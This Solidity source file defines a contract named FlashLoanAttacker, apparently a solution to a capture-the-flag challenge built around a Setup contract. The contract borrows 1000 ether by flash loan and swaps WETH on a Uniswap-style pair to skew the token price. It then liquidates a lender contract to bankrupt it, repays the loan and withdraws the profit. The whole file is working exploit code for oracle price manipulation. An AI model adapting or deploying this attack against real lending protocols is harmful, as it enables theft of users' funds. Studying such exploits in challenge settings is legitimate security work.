pragma solidity 0.8.7;


import './Setup.sol';
import "./SafeMath.sol";

contract FlashLoanAttacker {

    using SafeMath for uint;
    
    uint256 constant DECIMALS = 1 ether;

    address public flashloanAddr;
    address public lenderAddr;
    address public uniAddr;
    address public setupAddr;
    address public tokenAddr;

    Setup setup;

    WETH9 public constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    event Debug(uint256 amount);

    function setAddr(address _setupAddr) public {
      setupAddr = _setupAddr;
      setup = Setup(setupAddr);
      flashloanAddr = address(setup.flashloanPool());
      lenderAddr = address(setup.lender());
      uniAddr = address(setup.pair());
      tokenAddr = address(setup.token());
    }

    function getLenderRemainWeth() public view returns (uint256){
      return weth.balanceOf(address(lenderAddr));
    }
    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {
        require(tokenA != tokenB, 'UniswapV2Library: IDENTICAL_ADDRESSES');
        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        require(token0 != address(0), 'UniswapV2Library: ZERO_ADDRESS');
    }
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) {
        require(amountIn > 0, 'UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT');
        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
        uint amountInWithFee = amountIn.mul(997);
        uint numerator = amountInWithFee.mul(reserveOut);
        uint denominator = reserveIn.mul(1000).add(amountInWithFee);
        amountOut = numerator / denominator;
    }

    // given an output amount of an asset and pair reserves, returns a required input amount of the other asset
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) internal pure returns (uint amountIn) {
        require(amountOut > 0, 'UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT');
        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
        uint numerator = reserveIn.mul(amountOut).mul(1000);
        uint denominator = reserveOut.sub(amountOut).mul(997);
        amountIn = (numerator / denominator).add(1);
    }
    function getAmountsOut(uint amountIn, address[] memory path) internal view returns (uint[] memory amounts) {
        require(path.length >= 2, 'UniswapV2Library: INVALID_PATH');
        amounts = new uint[](path.length);
        amounts[0] = amountIn;
        for (uint i; i < path.length - 1; i++) {
            (uint reserveOut, uint reserveIn, ) = IUniswapV2Pair(uniAddr).getReserves();
            amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut);
        }
    }

    // performs chained getAmountIn calculations on any number of pairs
    function getAmountsIn(uint amountOut, address[] memory path) internal view returns (uint[] memory amounts) {
        require(path.length >= 2, 'UniswapV2Library: INVALID_PATH');
        amounts = new uint[](path.length);
        amounts[amounts.length - 1] = amountOut;
        for (uint i = path.length - 1; i > 0; i--) {
            (uint reserveOut, uint reserveIn, ) = IUniswapV2Pair(uniAddr).getReserves();
            amounts[i - 1] = getAmountIn(amounts[i], reserveIn, reserveOut);
        }
    }

    function _swap(uint[] memory amounts, address[] memory path, address _to) private {
        for (uint i; i < path.length - 1; i++) {
            (address input, address output) = (path[i], path[i + 1]);
            (address token0,) = sortTokens(input, output);
            uint amountOut = amounts[i + 1];
            (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOut) : (amountOut, uint(0));
            IUniswapV2Pair(uniAddr).swap(amount0Out, amount1Out, _to, new bytes(0));
        }
    }
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] memory path,
        address to
    ) internal returns (uint[] memory amounts) {
        amounts = getAmountsOut(amountIn, path);
        require(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');
        weth.transfer(uniAddr, amounts[0]);
        _swap(amounts, path, to);
    }

    // this will be called by others
    function receiveFlashLoan(uint256 _amount) public {
      // this contract receives _amount of ether
      
      // let lender brankrupt: liquidate the lender
      weth.approve(address(lenderAddr), type(uint256).max);
      weth.approve(address(uniAddr), type(uint256).max);
      Token(tokenAddr).approve(address(lenderAddr), type(uint256).max);
      Token(tokenAddr).approve(address(uniAddr), type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = tokenAddr;

      swapExactTokensForTokens(15 ether, 0, path, address(this));
      uint256 token_amount = Token(tokenAddr).balanceOf(address(this));

      Lender(lenderAddr).liquidate(setupAddr, token_amount);

      // returns money
      weth.transfer(flashloanAddr, _amount);
    }

    // first exec this
    function attack() public {
      FlashLoan(flashloanAddr).flashLoan(1000 ether);
    }

    // attacker then exec this
    function withdraw() public {
        weth.transfer(msg.sender, weth.balanceOf(address(this)));
    }
}